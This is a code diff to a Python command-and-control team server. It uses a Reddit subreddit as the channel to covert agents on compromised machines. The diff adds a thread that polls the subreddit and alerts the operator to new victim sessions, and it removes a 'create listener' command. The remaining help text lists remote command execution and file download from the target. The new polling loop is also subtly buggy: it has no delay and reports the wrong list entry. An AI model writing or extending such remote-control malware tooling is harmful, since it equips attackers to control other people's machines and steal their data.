@@ -9,6 +9,8 @@ from encryption import *
 from banner import *
 import autocomplete
 import readline
+import numpy
+import threading
 
 comp = autocomplete.Completer()
 # we want to treat '/' as part of a word, so override the delimiters
@@ -18,6 +20,8 @@ readline.set_completer(comp.complete)
 
 #define the host's OS
 hostOS = platform.system()        
+
+init_target_list = []
 
 #Function to convert base64 to file
 def base64_to_file(base64_string, filename):
@@ -70,17 +74,25 @@ class TeamServer:
             self.__subreddit = self.reddit.subreddit(self.subreddit_name)
         return self.__subreddit
 
+    #alert the user for new agents
+    def newAgentCheck(self):
+        while True:
+            global init_target_list
+            new_target_list = []
+            for post in self.subreddit.hot(limit=None):
+                new_target_list.append(post.title)
+        
+            if(len(new_target_list) > len(init_target_list)):
+                print("\n[*] Received a new session from " + new_target_list[1])
+                #now the old array will become the new array
+                init_target_list = new_target_list.copy()
+        
+    
     #list all listeners (all post titles in a specific Subreddit)
     def listListeners(self):
         # Print the titles of all posts
         for post in self.subreddit.hot(limit=None):
             print("[*] " + post.title)
-        
-    #post into the subreddit
-    def createPost(self):
-        postContent = "" #add a post content if you don't want to leave the post body empty
-        #create a post
-        self.subreddit.submit(self.listener_name, selftext=postContent)
 
     def verifySession(self):
         for submission in self.subreddit.top(time_filter='all'):
@@ -89,9 +101,14 @@ class TeamServer:
         return self.submission
         
     def sub_exists(self):
+        global init_target_list
+        
         exists = True
         try:
             self.reddit.subreddits.search_by_name(self.subreddit_name, exact=True)
+            #add the agents to the array
+            for post in self.subreddit.hot(limit=None):
+                init_target_list.append(post.title)
         except NotFound:
             exists = False
         return exists
@@ -162,6 +179,8 @@ if __name__ == "__main__":
             t.subreddit_name = command[14:]
             if t.sub_exists():
                 print("[*] Subreddit set to: " + command[14:])
+                t1 = threading.Thread(target=t.newAgentCheck)
+                t1.start()
             else:
                 t.subreddit_name = None
                 print("[-] The selected subreddit doesn't exist or doesn't have propper permissions. Try again with another subreddit.")
@@ -172,16 +191,6 @@ if __name__ == "__main__":
                 print("[!] Use the 'set subreddit' command first.")
             else:
                 t.listListeners()
-
-        #careful, only execute this once
-        elif command[:15] == "create listener":
-            listener_name = command[16:]
-            if t.subreddit_name is None:
-                print("[!] Use the 'set subreddit' command first.")
-            else:
-                t.listener_name = listener_name
-                t.createPost()
-                print("[+] Listener created")
 
         elif command[:12] == "use listener":
             if t.subreddit_name is None:
@@ -256,7 +265,6 @@ if __name__ == "__main__":
             print("""
 set subreddit [subreddit_name]   --> Select the subreddit where you will create the listener
 list listeners                   --> List all listeners you can use within the subreddit
-create listener [listener_name]  --> Create a post in subreddit where the traffic will ocurr
 use listener [listener_name]     --> Interact With Each Session Individually
 run [command]                    --> Execute a cmd command
 download [file_name]             --> Download a file from the target
